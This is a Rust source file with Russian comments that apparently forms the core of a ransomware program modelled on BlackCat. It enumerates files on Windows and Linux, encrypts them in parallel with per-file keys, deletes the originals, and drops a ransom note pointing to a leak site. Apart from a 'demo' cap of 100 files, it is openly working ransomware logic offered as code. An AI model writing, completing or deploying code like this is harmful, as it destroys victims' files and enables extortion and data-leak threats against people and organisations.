use tokio::task;
use std::fs;
use std::path::Path;

pub struct BlackCatRansomware {
    config: crate::config::BlackCatConfig,
    crypto: crate::crypto::CryptoEngine,
}

impl BlackCatRansomware {
    pub fn new(
        config: crate::config::BlackCatConfig,
        crypto: crate::crypto::CryptoEngine,
    ) -> Self {
        BlackCatRansomware { config, crypto }
    }
    
    /// Основной метод выполнения ransomware
    pub async fn execute(&self, target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] BlackCat ransomware execution started");
        println!("[*] Access Token: {}", self.config.access_token);
        println!("[*] Encryption Mode: {}", self.config.encryption_mode);
        
        // Валидируем конфигурацию
        self.config.validate()?;
        
        // Платформо-специфичная подготовка
        #[cfg(target_os = "windows")]
        {
            let windows = crate::windows::WindowsAttacker::new(self.config.clone());
            windows.execute().await?;
            
            // Enumerate files на Windows
            let files = windows.enumerate_files_to_encrypt(target_path);
            self.encrypt_files(&files).await?;
        }
        
        #[cfg(target_os = "linux")]
        {
            let linux = crate::linux::LinuxAttacker::new(self.config.clone());
            linux.execute().await?;
            
            // Enumerate files на Linux
            let files = linux.enumerate_files_to_encrypt(target_path);
            self.encrypt_files(&files).await?;
        }
        
        // Создаем ransom note
        self.create_ransom_note(target_path)?;
        
        println!("[+] Ransomware execution completed");
        Ok(())
    }
    
    /// Шифрует файлы используя параллельную обработку
    async fn encrypt_files(&self, files: &[std::path::PathBuf]) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Starting file encryption ({} files)...", files.len());
        
        let mut tasks = Vec::new();
        
        for file_path in files.iter().take(100) { // Для демо берем первые 100 файлов
            let file_path = file_path.clone();
            let config = self.config.clone();
            let crypto = self.crypto.clone(); // Нужно сделать crypto cloneable
            
            let task = task::spawn_blocking(move || {
                BlackCatRansomware::encrypt_single_file(&file_path, &config, &crypto)
            });
            
            tasks.push(task);
        }
        
        // Ждем завершения всех задач
        for task in tasks {
            let _result = task.await;
        }
        
        println!("[+] File encryption completed");
        Ok(())
    }
    
    /// Шифрует один файл
    fn encrypt_single_file(
        file_path: &std::path::Path,
        config: &crate::config::BlackCatConfig,
        crypto: &crate::crypto::CryptoEngine,
    ) -> Result<(), Box<dyn std::error::Error>> {
        // Читаем оригинальный файл
        let original_content = fs::read(file_path)?;
        
        // Генерируем ключ и nonce
        let aes_key = crate::crypto::CryptoEngine::generate_aes_key();
        let nonce = crate::crypto::CryptoEngine::generate_nonce();
        let nonce_arr: [u8; 12] = nonce.try_into()?;
        
        // Создаем зашифрованную структуру
        let encrypted_data = crypto.create_encrypted_file_structure(
            &original_content,
            &aes_key,
            &nonce_arr,
            true, // use ChaCha20
        )?;
        
        // Записываем зашифрованный файл с новым расширением
        let encrypted_path = file_path.with_extension(&config.encryption_extension);
        fs::write(&encrypted_path, encrypted_data)?;
        
        // Удаляем оригинальный файл
        fs::remove_file(file_path)?;
        
        println!("[+] Encrypted: {:?}", encrypted_path);
        Ok(())
    }
    
    /// Создает ransom note в каждой директории
    fn create_ransom_note(&self, root_path: &str) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Creating ransom notes...");
        
        let note_filename = "README_IMPORTANT.txt";
        
        let note_content = format!(
            "{}\\n\\n{}\\n\\nLeak Site: {}",
            self.config.ransom_note_short,
            self.config.ransom_note_full,
            self.config.leak_site_url
        );
        
        // Пишем note в корневую директорию
        let note_path = Path::new(root_path).join(note_filename);
        fs::write(note_path, note_content)?;
        
        println!("[+] Ransom notes created");
        Ok(())
    }
}
